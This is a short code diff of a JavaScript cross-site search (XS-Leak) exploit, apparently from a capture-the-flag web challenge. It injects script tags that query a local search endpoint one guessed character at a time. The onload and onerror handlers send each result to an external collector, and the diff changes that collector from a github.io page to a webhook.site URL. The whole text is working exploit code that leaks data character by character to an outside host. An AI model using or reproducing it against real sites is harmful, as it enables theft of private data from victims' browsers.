@@ -3,10 +3,10 @@ function test(char) {
   let s = document.createElement('script');
   s.src = `http://127.0.0.1:8000/search?query=${char}`;
   s.onload = () => {
-    fetch("https://abcdefff1.github.io/log?result=1&char=" + char);
+    fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e" + char);
   };
   s.onerror = () => {
-    fetch("https://abcdefff1.github.io/log?result=0&char=" + char);
+    fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e" + char);
   };
   document.body.appendChild(s);
 }
